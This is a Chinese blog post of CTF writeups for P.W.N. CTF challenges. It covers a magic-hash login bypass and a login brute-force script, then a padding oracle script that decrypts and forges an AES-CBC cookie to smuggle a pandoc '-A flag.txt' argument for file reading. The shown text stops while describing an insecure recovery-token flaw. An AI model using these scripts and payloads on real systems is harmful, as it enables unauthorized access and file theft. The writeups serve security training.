<!DOCTYPE html>
<html lang=zh>
<head><meta name="generator" content="Hexo 3.9.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="Login SecLogin 1的代码如下: 123456789101112131415161718192021222324252627282930var http = require(&apos;http&apos;);const crypto = require(&apos;crypto&apos;);var url = require(&apos;url&apos;);var fs = require(&apos;fs&apos;);var _0x86d1=[&quot;\x68">
<meta property="og:type" content="article">
<meta property="og:title" content="P.W.N. CTF Writeup">
<meta property="og:url" content="http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/index.html">
<meta property="og:site_name" content="Z3R0YU">
<meta property="og:description" content="Login SecLogin 1的代码如下: 123456789101112131415161718192021222324252627282930var http = require(&apos;http&apos;);const crypto = require(&apos;crypto&apos;);var url = require(&apos;url&apos;);var fs = require(&apos;fs&apos;);var _0x86d1=[&quot;\x68">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://i.loli.net/2018/11/01/5bdad0df8f22e.png">
<meta property="og:image" content="https://i.loli.net/2018/11/01/5bdad0dfc9b22.png">
<meta property="og:image" content="https://i.loli.net/2018/11/02/5bdc0a1864318.png">
<meta property="og:image" content="https://i.loli.net/2018/11/02/5bdc17da5c3fc.png">
<meta property="og:image" content="https://i.loli.net/2018/11/02/5bdc17d94dd01.png">
<meta property="og:updated_time" content="2018-11-13T15:25:14.859Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="P.W.N. CTF Writeup">
<meta name="twitter:description" content="Login SecLogin 1的代码如下: 123456789101112131415161718192021222324252627282930var http = require(&apos;http&apos;);const crypto = require(&apos;crypto&apos;);var url = require(&apos;url&apos;);var fs = require(&apos;fs&apos;);var _0x86d1=[&quot;\x68">
<meta name="twitter:image" content="https://i.loli.net/2018/11/01/5bdad0df8f22e.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>P.W.N. CTF Writeup</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml">
    
</head>

<body class="max-width mx-auto px3 ltr">    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/11/11/assembly-note/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018/11/02/Cracking-LCG/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&text=P.W.N. CTF Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&is_video=false&description=P.W.N. CTF Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=P.W.N. CTF Writeup&body=Check out this article: http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&name=P.W.N. CTF Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Login-Sec"><span class="toc-number">1.</span> <span class="toc-text">Login Sec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Converter"><span class="toc-number">2.</span> <span class="toc-text">Converter</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LCG-and-the-X"><span class="toc-number">3.</span> <span class="toc-text">LCG and the X</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#H-pster-Startup"><span class="toc-number">4.</span> <span class="toc-text">H!pster Startup</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        P.W.N. CTF Writeup
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Z3R0YU</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-11-02T10:33:15.000Z" itemprop="datePublished">2018-11-02</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="Login-Sec"><a href="#Login-Sec" class="headerlink" title="Login Sec"></a>Login Sec</h1><p><strong>Login 1</strong>的代码如下:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _0x86d1=[<span class="string">"\x68\x65\x78"</span>,<span class="string">"\x72\x61\x6E\x64\x6F\x6D\x42\x79\x74\x65\x73"</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">         &#123;</span><br><span class="line">             x: crypto[_0x86d1[<span class="number">1</span>]](<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">         &#125;[x].toString(_0x86d1[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html'</span>&#125;);</span><br><span class="line">    passwd = generatePart1() + generatePart2();</span><br><span class="line">    <span class="keyword">var</span> url_content = url.parse(req.url, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (passwd == url_content.query.passwd) &#123;</span><br><span class="line">       res.write(fs.readFileSync(<span class="string">'flag.txt'</span>, <span class="string">'utf8'</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.write(<span class="string">'&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.end();</span><br><span class="line">&#125;).listen(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure>
<p>我在此将其简化一下，方便本地运行。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _0x86d1=[<span class="string">"\x68\x65\x78"</span>,<span class="string">"\x72\x61\x6E\x64\x6F\x6D\x42\x79\x74\x65\x73"</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">                 &#123;</span><br><span class="line">                         x: crypto[_0x86d1[<span class="number">1</span>]](<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">                 &#125;[x].toString(_0x86d1[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    passwd = generatePart1() + generatePart2();</span><br><span class="line">    <span class="built_in">console</span>.log(passwd)</span><br></pre></td></tr></table></figure>
<p>运行结果为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> zeroyu@zeros  ~/Desktop  node login.js</span><br><span class="line">undefined1337</span><br></pre></td></tr></table></figure>
<p>提交<code>undefined1337</code>得到flag的第一部分<code>flag{W0w_1_gu3ss_th1s</code></p>
<p><strong>Login 2</strong>的代码如下，可以看出是md5的弱类型比较，只要求md5之后的值开头是0e即可，提交<code>s878926199a</code>得到下一部分的flag<code>_t0_be_4_pr3tty_</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (hash(<span class="string">"md5"</span>, $_GET[<span class="string">'passwd'</span>]) == <span class="string">'0e514198428367523082236389979035'</span>)        &#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>Login 3</strong>部分代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_from_directory</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">passwd = open(<span class="string">"/opt/passwd.txt"</span>).read()</span><br><span class="line">flag = open(<span class="string">"/opt/flag.txt"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    userpw = request.args.get(<span class="string">"passwd"</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> userpw == passwd:</span><br><span class="line">        <span class="keyword">return</span> flag, <span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">assert</span>(len(passwd) == <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">assert</span>(passwd.isdigit())</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<p>关键在于一下两行:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert(len(passwd) == 3)</span><br><span class="line">assert(passwd.isdigit())</span><br></pre></td></tr></table></figure>
<p>这两行判断了从<code>/opt/passwd.txt</code>中读出的内容的长度是否是3，类型是否是数字。一般我们可能会字节考虑<code>100-999</code>,但是要知道<code>000、009</code>这些长度也是3，也是数字类型。所以写爆破脚本如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">        url = <span class="string">"http://login3.uni.hctf.fun/?passwd=%03d"</span> % i</span><br><span class="line">        r = requests.get(url).content</span><br><span class="line">        s = <span class="string">"""&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;"""</span></span><br><span class="line">        <span class="keyword">if</span>(s != r.decode(<span class="string">'utf-8'</span>)):</span><br><span class="line">                print(i)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>最终爆破得到结果:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> zeroyu@zeros  ~/Desktop  python testlogin.py</span><br><span class="line">7</span><br></pre></td></tr></table></figure>
<p>提交<code>007</code>得到最后一部分flag <code>4_d4mn_l0ng_fl4g}</code></p>
<h1 id="Converter"><a href="#Converter" class="headerlink" title="Converter"></a>Converter</h1><p>target:<code>http://converter.uni.hctf.fun/</code></p>
<p>分析之后，可以看到vals的长度是16的倍数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">content=test</span><br><span class="line"></span><br><span class="line">vals=abe356a36f821925d21c83ed298f35136ba2089bcd4961c4af60426f0e392113a74bc8e5dbcc77aa244833318636d73a0e1c9a6072e40b115743d5f0dbbbc7b9</span><br><span class="line"></span><br><span class="line">128个字符</span><br><span class="line"></span><br><span class="line">content=testtest</span><br><span class="line"></span><br><span class="line">vals=3594a122720368f402eca150c2d85b82634027d10b41145c06a4396987ff1f4b53d9cfc2d3bd4a3f5a73b4c00bfe158e928d52d868a32ff949a456ab2834fe696435316fd2227396112b0d65fb104961</span><br><span class="line"></span><br><span class="line">160个字符</span><br><span class="line"></span><br><span class="line">content=testtestte</span><br><span class="line"></span><br><span class="line">vals=ea63f05d45c98e48208261d6e2d2a5d336d657d0ca1b5ca41bf0c8bade5f2db59724e76bdfca4bdefaae182cd1246451d9d2f0b79c867eecd90c1c0fd12f65ff74d174b9ff0f6f97bbfc8c3be536f265</span><br><span class="line"></span><br><span class="line">160个字符</span><br></pre></td></tr></table></figure></p>
<p>比如以下这组数据:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">content=t</span><br><span class="line"></span><br><span class="line">vals=a7cef9264688e0abc6717d25c3682ff2452e6ab9d98f6d0f7203b5fb2512d4982189f0f4a0748005a19d93166c15f12855ccbeba2bd7fb8c9283c969df631551</span><br></pre></td></tr></table></figure>
<p>我们修改vals的第一位后发送请求，得到一个错误<code>JSONDecodeError: Expecting value: line 1 column 1 (char 0)</code>，修改最后一位发送请求，得到一个<code>ValueError: Invalid padding bytes.</code>。由以上两点可以看出，cookie中包含<code>AES-CBC-encrypted JSON</code>数据。所以在这种分组加密中我们可以联想到Padding Oracle攻击，关于这种攻击可以参考:</p>
<p><a href="https://www.jianshu.com/p/ad8bdd87e131" target="_blank" rel="noopener">《Web狗要懂的Padding Oracle攻击》</a></p>
<p><a href="https://err0rzz.github.io/2017/11/23/Padding-Oracle-%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">《Padding_Oracle 攻击》</a></p>
<p>接下来我们使用脚本将cookie值进行解密:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># you need get padding_oracle from there</span></span><br><span class="line"><span class="comment"># https://github.com/pspaul/padding-oracle</span></span><br><span class="line"><span class="comment"># you need python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> padding_oracle <span class="keyword">import</span> PaddingOracle</span><br><span class="line"><span class="keyword">from</span> optimized_alphabets <span class="keyword">import</span> json_alphabet</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(cipher_hex)</span>:</span></span><br><span class="line">    headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'vals=&#123;&#125;'</span>.format(cipher_hex)&#125;</span><br><span class="line">    r = requests.get(<span class="string">'http://converter.uni.hctf.fun/convert'</span>, headers=headers)</span><br><span class="line">    response = r.content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'Invalid padding bytes.'</span> <span class="keyword">not</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">o = PaddingOracle(oracle, max_retries=<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">'b5290bd594ba08fa58b1d5c7a19f876c338191a51eeeac94c2b434bdb8adbfb8596f996d6eddca93c059e3dc35f7bef36b57a5611250ec4528c11e1573799d2178c54c034b9ea8fda8ae9a4a41c67763'</span></span><br><span class="line">plain, _ = o.decrypt(cipher, optimized_alphabet=json_alphabet())</span><br><span class="line">print(<span class="string">'Plaintext: &#123;&#125;'</span>.format(plain))</span><br></pre></td></tr></table></figure>
<p>解密后cookie的内容为<code>{&quot;f&quot;: &quot;markdown&quot;, &quot;c&quot;: &quot;AAAABBBBCCCCDDDD&quot;, &quot;t&quot;: &quot;html4&quot;}</code>，一般这种文档转换使用的是<code>pandoc</code>，此处的<code>f</code>是控制输入格式，<code>c</code>是我们输入的内容，<code>t</code>是控制输出格式。</p>
<p>由题目可知我们要读取flag.txt中的内容，所以我们使用pandoc的<code>-A</code>参数，把flag.txt的内容包含出来。</p>
<blockquote>
<p>-A FILE, –include-after-body=FILE<br>Include contents of FILE, verbatim, at the end of the document body (before the  tag in HTML, or the \end{document} command in LaTeX). This option can be used repeatedly to include multiple files. They will be included in the order specified. Implies –standalone.</p>
</blockquote>
<p>要注意此处前端好像有白名单过滤，直接代入我们的参数话得不到我们想要的结果。</p>
<p><a href="https://i.loli.net/2018/11/01/5bdad0df8f22e.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/01/5bdad0df8f22e.png" alt="屏幕快照 2018-11-01 下午6.06.45.png"></a></p>
<p>所以我在抓包之后修改cookie的值。cookie的生成脚本如下所示。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> padding_oracle <span class="keyword">import</span> PaddingOracle</span><br><span class="line"><span class="keyword">from</span> optimized_alphabets <span class="keyword">import</span> json_alphabet</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(cipher_hex)</span>:</span></span><br><span class="line">    headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'vals=&#123;&#125;'</span>.format(cipher_hex)&#125;</span><br><span class="line">    r = requests.get(<span class="string">'http://converter.uni.hctf.fun/convert'</span>, headers=headers)</span><br><span class="line">    response = r.content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'Invalid padding bytes.'</span> <span class="keyword">not</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">o = PaddingOracle(oracle, max_retries=<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">'b5290bd594ba08fa58b1d5c7a19f876c338191a51eeeac94c2b434bdb8adbfb8596f996d6eddca93c059e3dc35f7bef36b57a5611250ec4528c11e1573799d2178c54c034b9ea8fda8ae9a4a41c67763'</span></span><br><span class="line">plain     = <span class="string">b'&#123;"f": "markdown", "c": "AAAABBBBCCCCDDDD", "t": "html4"&#125;'</span></span><br><span class="line">plain_new = <span class="string">b'&#123;"f": "markdown -A flag.txt", "c": "D", "t": "html4"&#125;'</span></span><br><span class="line"></span><br><span class="line">cipher_new = o.craft(cipher, plain, plain_new)</span><br><span class="line">print(<span class="string">'Modified: &#123;&#125;'</span>.format(cipher_new))</span><br></pre></td></tr></table></figure>
<p>最终得到flag<br><a href="https://i.loli.net/2018/11/01/5bdad0dfc9b22.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/01/5bdad0dfc9b22.png" alt="屏幕快照 2018-11-01 下午6.03.36.png"></a></p>
<h1 id="LCG-and-the-X"><a href="#LCG-and-the-X" class="headerlink" title="LCG and the X"></a>LCG and the X</h1><p>打开主页看到如下描述，最后一句<code>Save secret messages prefixed with &quot;flag{&quot; (which is always handy...)</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hello!</span><br><span class="line">This is the website for our on-campus fanclub of the band LCG and the X!</span><br><span class="line">Everyone can signup for the club to:</span><br><span class="line"></span><br><span class="line">   Get the latest LCG news</span><br><span class="line">   Communicate with other fans</span><br><span class="line">   Save secret messages prefixed with &quot;flag&#123;&quot; (which is always handy...)</span><br></pre></td></tr></table></figure>
<p>接下我们进行注册登录，注册后可以看到如下信息：</p>
<p><a href="https://i.loli.net/2018/11/02/5bdc0a1864318.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/02/5bdc0a1864318.png" alt="屏幕快照 2018-11-02 下午4.25.25.png"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User Number: 34 </span><br><span class="line">Password: 4391179335210642486020975422279755323</span><br></pre></td></tr></table></figure>
<p>bitmap图片的地址为<code>http://lcgandthex.uni.hctf.fun/static/pics/34.bmp</code>，bitmap图片名称前面的序号和我们用户名的相同，所以如果我们更改图片前面的序号还可以下载其他的bitmap图片。而这个bitmap图片还是作为password recovery token来使用的，所以我们就可以利用它来重置别的账户的密码。</p>
<p>接下来我们进行登录，登陆后可以看到这样的信息。</p>
